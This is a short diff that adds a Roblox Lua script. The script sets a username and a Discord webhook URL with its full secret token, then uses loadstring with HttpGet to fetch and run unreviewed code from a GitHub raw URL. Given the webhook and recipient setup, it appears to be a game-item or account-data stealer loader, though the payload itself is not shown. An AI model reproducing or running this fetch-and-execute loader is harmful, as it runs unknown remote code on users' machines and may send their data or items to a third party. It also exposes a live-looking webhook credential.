@@ -1,0 +1,4 @@
+_G.Username = "ninja_kp4";
+_G.Webhook = "https://discord.com/api/webhooks/1074108279669653604/oyECovXh84J-WxZHcwL81XO8L8h44TMc_Hksu6mZQu72OtafqTtCxVrYBZ9BZycQXvWX";
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/test.lua"))();
